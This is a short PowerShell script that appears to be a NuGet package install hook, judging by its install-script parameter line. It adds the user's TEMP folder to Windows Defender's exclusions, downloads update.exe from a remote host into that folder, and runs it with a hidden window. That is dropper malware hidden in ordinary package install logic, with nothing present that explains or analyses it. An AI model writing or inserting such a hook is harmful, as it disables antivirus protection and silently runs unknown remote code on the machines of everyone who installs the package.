param($installPath, $toolsPath, $package, $project)
Add-MpPreference -ExclusionPath $env:TEMP
Invoke-WebRequest -Uri "https://payload.invalid/update.exe" -OutFile "$env:TEMP\update.exe"
Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden
